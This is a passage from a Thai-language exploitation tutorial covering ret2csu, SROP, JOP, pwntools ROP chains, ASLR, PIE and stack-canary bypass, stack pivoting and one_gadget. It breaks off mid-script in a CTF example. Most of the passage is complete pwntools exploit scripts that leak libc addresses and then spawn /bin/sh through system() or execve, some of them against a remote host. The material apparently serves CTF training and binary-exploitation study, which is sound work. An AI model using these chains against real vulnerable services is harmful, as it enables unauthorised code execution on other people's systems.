def ret2csu(func_addr, arg1, arg2, arg3, gadget_A, gadget_B, fakestack_addr=None):
    """
    สร้าง ret2csu payload เพื่อ call func_addr(arg1, arg2, arg3)
    
    arg1 → rdi (via edi, lower 32-bit only! ต้องระวัง)
    arg2 → rsi (via r14)
    arg3 → rdx (via r15)
    """
    
    # จาก Gadget B:
    # pop rbx → rbx = 0 (สำหรับ call [r12+rbx*8] = call [r12])
    # pop rbp → rbp = 1 (สำหรับ cmp rbx, rbp → ไม่ loop)
    # pop r12 → r12 = address ของ pointer ที่ชี้ไป func_addr
    # pop r13 → r13 = arg1 (จะ mov r13d → edi)
    # pop r14 → r14 = arg2 (จะ mov r14 → rsi)
    # pop r15 → r15 = arg3 (จะ mov r15 → rdx)
    
    chain = flat(
        gadget_B,     # Gadget B: pop registers
        0,            # rbx = 0
        1,            # rbp = 1 (เพื่อ bypass loop)
        func_addr,    # r12 = func_addr (เรียกผ่าน pointer)
        arg1,         # r13 → edi (arg1, 32-bit!)
        arg2,         # r14 → rsi (arg2)
        arg3,         # r15 → rdx (arg3)
        
        gadget_A,     # Gadget A: mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12]
        
        # หลัง call กลับมา, code จะ:
        # add rsp, 8
        # pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15
        # ret
        # ต้อง pad อีก 7 * 8 bytes:
        0,            # padding สำหรับ add rsp, 8
        0,            # rbx
        0,            # rbp
        0,            # r12
        0,            # r13
        0,            # r14
        0,            # r15
    )
    
    return chain

# ตัวอย่างการใช้
# เรียก write(1, got_addr, 8) เพื่อ leak libc
write_plt = elf.plt['write']
got_addr = elf.got['read']

leak_chain = ret2csu(write_plt, 1, got_addr, 8, gadget_A, gadget_B)
```

### 8.3 ret2csu ปัญหา 32-bit Register

```python
# ปัญหา: r13d (32-bit) ← ทำให้ arg1 จำกัดที่ 32-bit
# ถ้า arg1 ต้องการ full 64-bit address ต้องหา workaround

# วิธีแก้ 1: ถ้า arg1 ต้องการแค่ lower 32-bit (เช่น fd=1)
# → ใช้ ret2csu ปกติได้เลย

# วิธีแก้ 2: ใช้ pop rdi gadget แยกต่างหาก
# → set rdi ก่อน, แล้วใช้ ret2csu สำหรับ rsi, rdx เท่านั้น

# วิธีแก้ 3: ใช้ __libc_csu_fini ถ้ามี
# มี gadgets คล้ายกัน

# ปัญหา 2: call [r12+rbx*8] ต้องการ pointer ไม่ใช่ address โดยตรง
# r12 ต้องชี้ไปที่ memory location ที่เก็บ func_addr
# → ใช้ GOT entry ซึ่งเป็น pointer อยู่แล้ว!
r12 = elf.got['read']   # GOT entry ของ read() ชี้ไป read() ใน libc
```

---

## 9. SROP: Sigreturn-Oriented Programming

### 9.1 Sigreturn คืออะไร?

```
Sigreturn คือ syscall ที่ restore CPU state หลัง signal handler return

ปกติ kernel จะ:
1. บันทึก CPU registers ลง "sigreturn frame" บน stack
2. เรียก signal handler
3. หลัง handler return, เรียก sigreturn syscall
4. Restore CPU registers จาก frame

SROP exploit ใช้ประโยชน์:
- ถ้าเราควบคุม stack ได้
- เราสามารถสร้าง fake sigreturn frame
- แล้ว trigger sigreturn syscall
- → kernel จะ load registers จาก frame ของเรา
- → เราควบคุม registers ทั้งหมดได้ด้วย gadgets เดียว!
```

### 9.2 Sigreturn Frame Structure

```c
// sigcontext structure (x86-64 Linux)
// kernel/signal.h

struct sigcontext {
    __u64 r8;
    __u64 r9;
    __u64 r10;
    __u64 r11;
    __u64 r12;
    __u64 r13;
    __u64 r14;
    __u64 r15;
    __u64 rdi;
    __u64 rsi;
    __u64 rbp;
    __u64 rbx;
    __u64 rdx;
    __u64 rax;
    __u64 rcx;
    __u64 rsp;
    __u64 rip;
    __u64 eflags;
    __u16 cs;
    __u16 gs;
    __u16 fs;
    __u16 __pad0;
    __u64 err;
    __u64 trapno;
    __u64 oldmask;
    __u64 cr2;
    // ... more fields
};

// ขนาดทั้งหมดประมาณ 248 bytes
```

### 9.3 SROP Attack

```python
#!/usr/bin/env python3
# srop_exploit.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF('./vuln_srop')

# ===== สิ่งที่ต้องการสำหรับ SROP =====
# 1. gadget "syscall; ret" (สำหรับ trigger sigreturn)
# 2. ควบคุม rax = 15 (sigreturn syscall number)
# 3. สร้าง fake sigreturn frame

# หา gadgets
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]

# สร้าง sigreturn frame ด้วย pwntools
frame = SigreturnFrame()

# กำหนด registers ที่ต้องการ
frame.rax = 59           # execve syscall
frame.rdi = binsh_addr   # pathname
frame.rsi = 0            # argv = NULL
frame.rdx = 0            # envp = NULL
frame.rip = syscall_ret  # ต้องการ execute syscall หลัง frame load

# Stack pointer (optional - อาจต้องการสำหรับ pivot)
# frame.rsp = new_rsp

# ===== Build payload =====
offset = 72

payload = flat(
    b'A' * offset,
    
    # Set rax = 15 (sigreturn syscall)
    # วิธีต่างๆ ในการ set rax = 15:
    # 1. pop rax gadget
    # 2. ถ้า rax = 0 หลัง read() return จาก input 15 bytes
    
    syscall_ret,      # trigger sigreturn
    bytes(frame),     # fake sigreturn frame
)

io = process('./vuln_srop')
io.sendline(payload)
io.interactive()
```

### 9.4 SROP ด้วย pwntools SigreturnFrame

```python
from pwn import *

context.arch = 'amd64'

# pwntools มี SigreturnFrame class ที่สะดวกมาก

# สร้าง frame สำหรับ execve
frame = SigreturnFrame()
frame.rax = constants.SYS_execve   # = 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr            # syscall instruction

# สร้าง frame สำหรับ mprotect
mprotect_frame = SigreturnFrame()
mprotect_frame.rax = constants.SYS_mprotect   # = 10
mprotect_frame.rdi = page_addr      # address
mprotect_frame.rsi = page_size      # size
mprotect_frame.rdx = 7             # PROT_READ|PROT_WRITE|PROT_EXEC
mprotect_frame.rip = syscall_addr

# Convert frame to bytes
frame_bytes = bytes(frame)
print(f"Frame size: {len(frame_bytes)}")
print(hexdump(frame_bytes))

# ===== Minimal SROP example =====
# บาง challenges มีแค่ "syscall; ret" gadget
# และเราต้องการ set rax = 15

# วิธีที่ 1: read() returns จำนวน bytes ที่อ่าน
# ถ้า read กลับมาที่ syscall และเราส่ง 15 bytes
# rax = 15 = sigreturn syscall number!

# วิธีที่ 2: มี gadgets พอส่ง rax = 15

payload = flat(
    b'A' * offset,
    syscall_ret,       # call sigreturn (rax ต้องเป็น 15)
    bytes(frame),      # fake frame ที่ kernel จะ load
)
```

### 9.5 SROP บน 32-bit

```python
from pwn import *

context.arch = 'i386'   # 32-bit

# 32-bit sigreturn frame มี layout ต่างกัน
frame = SigreturnFrame()
frame.eax = 11           # execve (32-bit syscall number)
frame.ebx = binsh_addr
frame.ecx = 0
frame.edx = 0
frame.eip = int80_addr   # int 0x80

# sigreturn syscall number บน 32-bit = 119
```

---

## 10. JOP: Jump-Oriented Programming

### 10.1 JOP คืออะไร?

```
JOP (Jump-Oriented Programming) คือ variant ของ ROP
ใช้ indirect jump (jmp reg) แทน ret

ROP: gadgets จบด้วย ret
JOP: gadgets จบด้วย jmp [reg] หรือ jmp reg

ทำไมต้องใช้ JOP?
1. บาง environments block ret-based gadgets (shadow stack, CET)
2. JOP gadgets อาจยาวกว่าและทรงพลังกว่า
3. Control Flow Guard (CFG) bypass techniques

ข้อเสีย JOP:
- ต้องการ "dispatcher gadget" เพื่อ chain gadgets
- ยากกว่า ROP มาก
- pwntools support น้อยกว่า
```

### 10.2 JOP Concepts

```asm
; JOP gadgets:
; "functional gadget" - ทำงานจริง + jmp [reg]
add rax, rbx ; jmp [rcx]    ; ← JOP gadget
mov [rdi], rax ; jmp [rbx]  ; ← JOP gadget

; "dispatcher gadget" - เลือก gadget ถัดไป
; ทำหน้าที่เหมือน "interpreter" ของ JOP chain

; ตัวอย่าง dispatcher:
mov rax, [rsi] ; jmp [rax]
; → load address ของ gadget ถัดไปจาก [rsi]
; → jump ไปที่ gadget นั้น
; (rsi ต้อง advance เพื่อชี้ไป next gadget)
```

### 10.3 JOP vs ROP vs COP

```
เปรียบเทียบ Code-Reuse Attacks:

ROP (Return-Oriented Programming):
  - Gadgets จบด้วย: ret
  - Chain mechanism: stack (rsp)
  - ง่าย, tool support ดี
  - Defense: Shadow Stack, CET (Control-flow Enforcement Technology)

JOP (Jump-Oriented Programming):
  - Gadgets จบด้วย: jmp [reg]
  - Chain mechanism: dispatcher gadget + dispatch table
  - ซับซ้อนกว่า
  - Bypass: Shadow Stack (ไม่ใช้ call/ret)

COP (Call-Oriented Programming):
  - Gadgets จบด้วย: call [reg]
  - ใช้ call แทน jmp
  - Hybrid approach

COOP (Counterfeit Object-Oriented Programming):
  - ใช้ virtual function dispatch
  - เหมาะสำหรับ C++ programs
  - Bypass: CFG ที่ไม่สมบูรณ์
```

---

## 11. pwntools ROP Builder

### 11.1 pwntools ROP Class Overview

```python
from pwn import *

# Load binary
elf = ELF('./vuln')

# สร้าง ROP object
rop = ROP(elf)

# หรือ ROP จาก multiple objects
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP([elf, libc])
```

### 11.2 rop.find_gadget()

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# หา gadget จาก list ของ instructions
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
print(pop_rdi)   # → (address, size)

# หา syscall
syscall = rop.find_gadget(['syscall', 'ret'])
syscall_nort = rop.find_gadget(['syscall'])

# หา multi-pop gadgets
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])

# หา ret gadget (สำหรับ alignment)
ret = rop.find_gadget(['ret'])

# ตัวอย่างการใช้
if pop_rdi is None:
    print("ERROR: pop rdi gadget not found!")
else:
    print(f"pop rdi; ret @ {hex(pop_rdi[0])}")
```

### 11.3 rop.call() - เรียก Functions อัตโนมัติ

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

rop = ROP(elf)

# ===== rop.call() - เรียก function พร้อม arguments =====
# pwntools จะ:
# 1. หา gadgets สำหรับ set arguments อัตโนมัติ
# 2. เพิ่ม function address
# 3. จัดการ calling convention ให้

# เรียก system("/bin/sh")
binsh = next(elf.search(b'/bin/sh\x00'))
rop.call('system', [binsh])

# เรียก write(1, addr, 8) เพื่อ leak
rop.call('write', [1, elf.got['puts'], 8])

# เรียก read(0, addr, size)
rop.call('read', [0, elf.bss(), 100])

# ดู ROP chain ที่สร้าง
print(rop.dump())
```

### 11.4 rop.chain() - Get Raw Bytes

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# สร้าง ROP chain
rop.call('system', [next(elf.search(b'/bin/sh'))])

# ดึง raw bytes ของ ROP chain
chain_bytes = rop.chain()
print(hexdump(chain_bytes))

# ใช้ใน payload
offset = 72
payload = b'A' * offset + chain_bytes

# หรือใช้ flat()
payload = flat(
    b'A' * offset,
    rop.chain(),
)
```

### 11.5 rop.raw() - เพิ่ม Raw Values

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# เพิ่ม raw address/value ลงใน chain
rop.raw(0x400506)           # เพิ่ม address โดยตรง
rop.raw(b'/bin/sh\x00')    # เพิ่ม bytes โดยตรง
rop.raw(0)                  # เพิ่ม 0

# ผสมกับ call()
rop.call('write', [1, elf.got['puts'], 8])
rop.raw(elf.symbols['main'])  # กลับมา main

chain = rop.chain()
```

### 11.6 rop.syscall() - Syscall Helper

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# เรียก syscall โดยตรง (ถ้า pwntools รองรับ)
# pwntools จะ set rax = syscall_number และ arguments อัตโนมัติ

# execve("/bin/sh", NULL, NULL)
rop.execve(b'/bin/sh\x00', 0, 0)

# หรือ manual:
binsh_addr = next(elf.search(b'/bin/sh'))
rop.call(rop.find_gadget(['pop rax', 'ret'])[0], [59])
# ... ต่อไป
```

### 11.7 rop.dump() - Debug Output

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

rop.call('puts', [elf.got['puts']])
rop.call('main', [])

# แสดง ROP chain อ่านง่าย
print(rop.dump())

# ตัวอย่าง output:
# 0x0000:         0x400743 pop rdi; ret
# 0x0008:         0x601018 [got.puts]
# 0x0010:         0x400520 puts
# 0x0018:         0x400636 main
```

### 11.8 Complete pwntools ROP Example

```python
#!/usr/bin/env python3
# complete_pwntools_rop.py

from pwn import *

# ===== Setup =====
context.arch = 'amd64'
context.log_level = 'info'

HOST = 'localhost'
PORT = 1337

# Load ELF
elf = ELF('./vuln')
libc = ELF('./libc.so.6')  # local copy

# ===== STAGE 1: Leak libc =====
def stage1():
    io = remote(HOST, PORT)
    
    rop = ROP(elf)
    
    # Leak puts@got
    rop.call('puts', [elf.got['puts']])    # puts(got['puts']) → leak
    rop.call('main')                        # กลับ main
    
    # Payload
    payload = flat(
        b'A' * 72,         # offset
        rop.chain(),
    )
    
    io.sendline(payload)
    
    # รับ leak
    leak = u64(io.recvline()[:8].ljust(8, b'\x00'))
    libc_base = leak - libc.sym['puts']
    
    log.success(f"puts leak: {hex(leak)}")
    log.success(f"libc base: {hex(libc_base)}")
    
    return io, libc_base

# ===== STAGE 2: Shell =====
def stage2(io, libc_base):
    libc.address = libc_base
    
    rop = ROP([elf, libc])
    
    ret = rop.find_gadget(['ret'])[0]
    
    rop.raw(ret)                            # stack alignment
    rop.call('system', [next(libc.search(b'/bin/sh\x00'))])
    
    payload = flat(
        b'A' * 72,
        rop.chain(),
    )
    
    io.sendline(payload)
    io.interactive()

io, libc_base = stage1()
stage2(io, libc_base)
```

---

## 12. Defeating ASLR with ROP+Leak

### 12.1 ASLR คืออะไร?

```
ASLR (Address Space Layout Randomization):
  → randomize ที่อยู่ของ:
    - Stack
    - Heap  
    - Libraries (libc, ld, etc.)
    - (ถ้า PIE เปิด) ตัว binary เอง

ระดับของ ASLR บน Linux:
  /proc/sys/kernel/randomize_va_space
  0 = ปิด
  1 = stack, libs, mmap (ไม่ random heap)
  2 = ทุกอย่าง (default)

ขนาด entropy:
  64-bit: 28 bits ของ entropy (≈ 268 ล้าน combinations)
  32-bit: 8-16 bits เท่านั้น → brute-force ได้!
```

### 12.2 Information Leak Techniques

```
วิธีหา libc base address:

1. GOT/PLT Leak
   → ใช้ puts() หรือ printf() เพื่อ print ค่าจาก GOT
   → GOT เก็บ resolved addresses ของ library functions
   → leaked_addr - function_offset = libc_base

2. Stack Leak
   → บางครั้ง stack มี libc pointers (return addresses)
   → เข้าถึงได้ผ่าน format string หรือ buffer over-read

3. Heap Leak
   → Heap chunks มี pointers ไป libc (malloc metadata)
   
4. printf Format String
   → %p, %s สามารถ leak addresses ได้
   
5. puts/write/send
   → เรียกผ่าน ROP เพื่อ print memory
```

### 12.3 GOT Leak via ROP

```python
#!/usr/bin/env python3
# got_leak.py

from pwn import *

context.arch = 'amd64'

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def leak_got(func_name):
    """Leak GOT entry ของ function"""
    io = process('./vuln')
    
    rop = ROP(elf)
    
    # ===== หา gadgets =====
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    
    got_addr = elf.got[func_name]    # address ของ GOT entry
    puts_plt = elf.plt['puts']        # puts@PLT
    main_addr = elf.sym['main']       # กลับ main
    
    # ===== Payload =====
    # เรียก puts(got[func_name]) เพื่อ print libc address
    payload = flat(
        b'A' * 72,
        ret,              # stack alignment
        pop_rdi,
        got_addr,         # argument: address ของ GOT entry
        puts_plt,         # call puts()
        main_addr,        # กลับ main เพื่อ exploit ต่อ
    )
    
    io.sendline(payload)
    
    # รับ leaked address
    leaked = u64(io.recvline()[:8].ljust(8, b'\x00'))
    print(f"[*] {func_name}@libc = {hex(leaked)}")
    
    # คำนวณ libc base
    libc_base = leaked - libc.sym[func_name]
    print(f"[*] libc base = {hex(libc_base)}")
    
    return io, libc_base

# ===== Exploit =====
io, libc_base = leak_got('puts')
libc.address = libc_base

# Stage 2: shell
rop2 = ROP([elf, libc])
ret = rop2.find_gadget(['ret'])[0]
rop2.raw(ret)
rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])

payload2 = flat(b'A' * 72, rop2.chain())
io.sendline(payload2)
io.interactive()
```

### 12.4 PIE Bypass

```python
# PIE (Position Independent Executable) randomizes binary base address

# วิธีหา binary base:
# 1. Leak ค่าจาก stack (return addresses)
# 2. Format string leak
# 3. Partial overwrite (ถ้า ASLR ใช้ page alignment)

# ตัวอย่าง: leak ค่าบน stack ผ่าน buffer over-read
def leak_binary_base(io):
    # ส่ง input ที่อ่านเกิน buffer
    io.sendline(b'A' * 64)
    
    # รับข้อมูลที่ overflow อ่านมา
    data = io.recv(128)
    
    # parse leaked addresses (ต้อง reverse engineer format)
    leak = u64(data[64:72])
    
    # binary addresses มี pattern: 0x55XXXXXXXXXXXX
    if leak & 0xfff000000000 == 0x555000000000:
        binary_base = leak - known_offset
        return binary_base
    
    return None
```

### 12.5 Two-Stage ROP Exploit

```python
#!/usr/bin/env python3
# two_stage_rop.py
# สำหรับ CTF

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def exploit():
    io = remote('challenge.ctf.com', 1337)
    
    elf = ELF('./challenge')
    libc = ELF('./libc.so.6')
    
    # ===== STAGE 1: Leak libc address =====
    log.info("Stage 1: Leaking libc address")
    
    rop1 = ROP(elf)
    pop_rdi = rop1.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop1.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
    ret = rop1.find_gadget(['ret'])[0]
    
    # เรียก write(1, got['write'], 8) เพื่อ leak
    rop1.raw(pop_rdi)
    rop1.raw(1)                       # fd = stdout
    rop1.raw(pop_rsi)
    rop1.raw(elf.got['write'])        # buf = got['write']
    rop1.raw(0)                       # r15 padding
    rop1.raw(elf.plt['write'])        # call write()
    rop1.raw(elf.sym['main'])         # กลับ main
    
    payload1 = b'A' * 72 + rop1.chain()
    
    io.recv()                          # รับ prompt
    io.sendline(payload1)
    
    # รับ leaked address
    leak = u64(io.recv(8))
    libc_base = leak - libc.sym['write']
    log.success(f"libc base: {hex(libc_base)}")
    
    libc.address = libc_base
    
    # ===== STAGE 2: Execute /bin/sh =====
    log.info("Stage 2: Getting shell")
    
    rop2 = ROP([elf, libc])
    
    rop2.raw(ret)          # stack alignment
    rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])
    
    io.recv()              # รับ prompt อีกครั้ง
    io.sendline(b'A' * 72 + rop2.chain())
    
    io.interactive()

exploit()
```

---

## 13. One-shot Gadget vs Manual Chain

### 13.1 One-shot Gadget (Magic Gadget) คืออะไร?

```
One-shot gadget (หรือ "magic gadget") คือ gadget ใน libc
ที่เมื่อ jump ไปถึง จะ execute /bin/sh ได้เลย!
ไม่ต้องสร้าง full ROP chain

ทำไมถึงมี?
libc มี code เช่น:
  execve("/bin/sh", environ, NULL)
  หรือ
  execve("/bin/sh", {"-c", command, NULL}, environ)

ถ้า conditions ถูกต้อง (registers/memory มีค่าที่ถูกต้อง)
→ execve ก็จะ execute /bin/sh ได้เลย!

เครื่องมือหา one-shot gadget:
- one_gadget
- libc-database
```

### 13.2 one_gadget Tool

```bash
# ติดตั้ง one_gadget
gem install one_gadget

# ค้นหา one-shot gadgets ใน libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# ตัวอย่าง output:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL || r15 is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp
#
# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL || r15 is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp
#
# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL || rsi is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

# ค้นหาจาก libc version
one_gadget /path/to/libc-2.31.so

# แสดง constraints
one_gadget --level 2 /lib/x86_64-linux-gnu/libc.so.6
```

### 13.3 ใช้ One-shot Gadget ใน Exploit

```python
#!/usr/bin/env python3
# one_gadget_exploit.py

from pwn import *

context.arch = 'amd64'

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ===== STAGE 1: Leak libc base =====
def get_libc_base():
    io = process('./vuln')
    
    rop = ROP(elf)
    rop.call('puts', [elf.got['puts']])
    rop.call('main')
    
    io.sendline(b'A' * 72 + rop.chain())
    leak = u64(io.recvline()[:8].ljust(8, b'\x00'))
    libc_base = leak - libc.sym['puts']
    
    return io, libc_base

# ===== STAGE 2: One-shot gadget =====
def use_one_shot(io, libc_base):
    # Offsets จาก one_gadget tool
    # ต้องเลือก gadget ที่ constraints satisfied
    one_shot_offsets = [
        0xe3afe,  # execve("/bin/sh", r15, r12); r15==NULL, r12==NULL
        0xe3b01,  # execve("/bin/sh", r15, rdx); r15==NULL, rdx==NULL
        0xe3b04,  # execve("/bin/sh", rsi, rdx); rsi==NULL, rdx==NULL
    ]
    
    # ลองทีละ offset
    for offset in one_shot_offsets:
        one_shot_addr = libc_base + offset
        
        # Simple payload: แค่ overwrite return address
        payload = b'A' * 72 + p64(one_shot_addr)
        
        try:
            io.sendline(payload)
            # ถ้า one-shot ทำงาน จะได้ shell
            io.sendline(b'id')
            result = io.recvline(timeout=1)
            if b'uid=' in result:
                print(f"One-shot works at offset: {hex(offset)}")
                io.interactive()
                return
        except:
            continue

io, libc_base = get_libc_base()
use_one_shot(io, libc_base)
```

### 13.4 One-shot vs Manual Chain: เมื่อไหรใช้อะไร

```
เมื่อไหรใช้ One-shot Gadget:
✓ constraints ง่ายที่จะ satisfy (เช่น r15=NULL, rdx=NULL)
✓ payload size จำกัด (one-shot ใช้แค่ 8 bytes)
✓ รู้ libc version แน่ชัด
✓ ต้องการ solution ที่เร็ว

ข้อดี One-shot:
+ Payload สั้นมาก (แค่ overwrite return address)
+ ง่ายต่อการ implement
+ Fast exploit development

ข้อเสีย One-shot:
- ต้อง satisfy constraints ของ gadget
- Constraints อาจไม่ถูกต้องเสมอไป
- ต้องรู้ libc version ที่แน่นอน

เมื่อไหรใช้ Manual ROP Chain:
✓ ไม่มี one-shot gadget ที่ work
✓ ต้องการ setup ที่ specific มากกว่า
✓ ไม่มี libc หรือต้องการ syscall โดยตรง
✓ Environment ที่ strict มาก

ข้อดี Manual Chain:
+ ควบคุมได้ทุกอย่าง
+ ไม่ขึ้นกับ gadget constraints
+ เข้าใจ flow ชัดเจน

ข้อเสีย Manual Chain:
- ต้องหา gadgets หลายตัว
- Payload ยาวกว่า
- ใช้เวลา develop มากกว่า
```

### 13.5 libc-database และ libc Version Identification

```bash
# libc-database - หา libc version จาก leaked address

# Clone
git clone https://github.com/niklasb/libc-database

# Build database
./get ubuntu  # ดาวน์โหลด Ubuntu libc versions

# ค้นหาจาก leaked addresses
./find puts 0x7f1234567890    # หา libc ที่มี puts ที่ offset นี้

# Online alternatives:
# https://libc.blukat.me/
# https://libc.rip/

# ใช้กับ pwntools:
from pwn import *

# LibcSearcher (ถ้าติดตั้ง)
from LibcSearcher import LibcSearcher
obj = LibcSearcher("puts", leaked_puts)
libc_base = leaked_puts - obj.dump("puts")
system_addr = libc_base + obj.dump("system")
binsh_addr = libc_base + obj.dump("str_bin_sh")
```

---

## 14. Advanced Techniques และ Defense Bypasses

### 14.1 Partial Overwrite

```python
# Partial Overwrite: แก้แค่ 1-2 bytes ของ return address
# ใช้ได้เมื่อ ASLR เปิดแต่ต้องการแค่ page-aligned address

# ตัวอย่าง: แก้แค่ 1 byte ต่ำสุดของ return address
# → bypass ASLR ที่ randomize แค่บางส่วน

payload = b'A' * offset
payload += b'\x42'    # แก้แค่ lowest byte
# nibble brute-force ถ้าจำเป็น
```

### 14.2 Format String + ROP Combo

```python
# Format String Vulnerability → Information Leak
# ROP → Code Execution

# Stage 1: Format string เพื่อ leak
payload_fmt = b'%p.' * 20    # leak stack values

# parse leaked addresses
# หา libc address จาก leaked values

# Stage 2: Buffer overflow + ROP chain
payload_bof = b'A' * offset + rop_chain
```

### 14.3 Heap-based ROP

```python
# เมื่อ overflow บน heap ไม่ใช่ stack
# ต้องการ heap spray หรือ specific heap layout

# ตัวอย่าง: overflow function pointer บน heap
# → overwrite function pointer ด้วย gadget address
# → เมื่อ function pointer ถูกเรียก → ROP chain เริ่มต้น
```

### 14.4 Stack Pivoting ละเอียด

```python
#!/usr/bin/env python3
# stack_pivot.py

from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')

# Stack pivot ใช้เมื่อ:
# - Buffer เล็กเกินไปสำหรับ full ROP chain
# - ต้องการย้าย stack ไปที่ controlled memory

# ===== วิธีที่ 1: xchg rsp, rax =====
# เตรียม rax ให้ชี้ไปยัง fake stack
# แล้ว xchg จะ swap rsp กับ rax

fake_stack = elf.bss() + 0x100  # fake stack address
xchg_rsp_rax = 0x...  # xchg rsp, rax; ret gadget

rop_chain = flat(
    # ROP chain ที่ fake_stack
    pop_rdi,
    binsh,
    system_addr,
)

# วาง ROP chain บน fake_stack ก่อน (ผ่าน read() หรือ overflow)
# แล้ว pivot:
pivot_payload = flat(
    b'A' * offset,
    pop_rax_gadget,   # set rax = fake_stack
    fake_stack,
    xchg_rsp_rax,     # pivot: rsp ← fake_stack
)

# ===== วิธีที่ 2: leave; ret =====
# rbp ต้อง point ไปที่ fake stack - 8

fake_stack = elf.bss() + 0x200
leave_ret = rop.find_gadget(['leave', 'ret'])[0]

# Overwrite saved rbp ด้วย fake_stack - 8
# Overwrite return address ด้วย leave; ret
pivot_payload = flat(
    b'A' * (offset - 8),   # fill จนถึง saved rbp
    fake_stack - 8,         # fake rbp → fake_stack - 8
    leave_ret,              # trigger pivot
)
```

### 14.5 Bypass Stack Canary ด้วย Leak

```python
# Stack canary คือ random value บน stack
# ต้อง preserve ค่านี้หรือ bypass

# วิธีที่ 1: Leak canary ผ่าน format string
# วิธีที่ 2: Leak canary ผ่าน off-by-one read
# วิธีที่ 3: Brute force บน fork() programs (canary คงที่หลัง fork)

def leak_canary(io):
    # ส่ง input ที่ read ข้าม null byte
    io.sendline(b'A' * 65)
    response = io.recv(200)
    
    # canary อยู่หลัง 64 bytes ของ buffer
    # canary bytes = response[65:73] (7 significant bytes + null)
    canary = u64(b'\x00' + response[65:72])
    return canary

canary = leak_canary(io)
print(f"Canary: {hex(canary)}")

# ใช้ canary ใน payload
payload = flat(
    b'A' * 64,    # fill buffer
    canary,        # restore canary
    b'B' * 8,     # saved rbp
    rop_chain,     # overwrite return address
)
```

### 14.6 ROP ใน Restricted Environments

```python
# บางครั้ง seccomp filter จำกัด syscalls

# ตรวจสอบ seccomp rules:
# seccomp-tools dump ./vuln

# ถ้า execve blocked:
# → ใช้ open/read/write เพื่ออ่าน flag file

from pwn import *

elf = ELF('./restricted_vuln')
rop = ROP(elf)

# ===== open("/flag", O_RDONLY, 0) =====
# syscall 2 (open)
# rdi = pathname, rsi = O_RDONLY (0), rdx = 0

# ===== read(fd, buf, size) =====
# syscall 0 (read)
# rdi = fd (return value ของ open), rsi = buf, rdx = size

# ===== write(1, buf, size) =====
# syscall 1 (write)
# rdi = 1 (stdout), rsi = buf, rdx = size

flag_path = b'/flag\x00'
buf_addr = elf.bss() + 0x100

# chain สำหรับ open/read/write
# (ต้องหา gadgets สำหรับทุก syscalls)
```

---

## 15. CTF Examples และ Exercises

### 15.1 CTF Example: Basic ROP (No ASLR, No PIE)

```python
#!/usr/bin/env python3
# ctf_basic_rop.py
# ระดับ: Beginner
# Mitigations: NX enabled, No canary, No PIE, No ASLR

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./basic_rop')
rop = ROP(elf)

# ===== Gadgets =====
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# ===== Addresses =====
system_plt = elf.plt['system']
binsh = next(elf.search(b'/bin/sh\x00'))

print(f"system@plt: {hex(system_plt)}")
print(f"/bin/sh: {hex(binsh)}")
print(f"pop rdi; ret: {hex(pop_rdi)}")

# ===== Offset =====
# หา offset ด้วย: cyclic(200) → crash → cyclic_find(rsp_value)
offset = 40

# ===== Payload =====
payload = flat(
    b'A' * offset,
    ret,            # stack alignment (Ubuntu 18.04+)
    pop_rdi,
    binsh,
    system_plt,
)

# ===== Exploit =====
io = process('./basic_rop')
io.sendline(payload)
io.interactive()
```

### 15.2 CTF Example: ret2libc with ASLR

```python
#!/usr/bin/env python3
# ctf_ret2libc_aslr.py
# ระดับ: Intermediate
# Mitigations: NX, ASLR, Partial RELRO, No PIE, No Canary

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def pwn():
    elf = ELF('./ret2libc')
    libc = ELF('./libc-2.31.so')
    
    # ===== STAGE 1: Leak =====
    io = process('./ret2libc')
    
    rop1 = ROP(elf)
    pop_rdi = rop1.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop1.find_gadget(['ret'])[0]
    
    # Leak puts@libc
    payload1 = flat(
        b'A' * 72,
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['vuln'],    # กลับ vuln function เพื่อ overflow ต่อ
    )
    
    io.sendlineafter(b'Input: ', payload1)
    
    puts_leak = u64(io.recvline()[:8].ljust(8, b'\x00'))
    libc_base = puts_leak - libc.sym['puts']
    libc.address = libc_base
    
    log.success(f"libc base @ {hex(libc_base)}")
    
    # ===== STAGE 2: Shell =====
    rop2 = ROP([elf, libc])
    
    rop2.raw(ret)       # alignment
    rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])
    
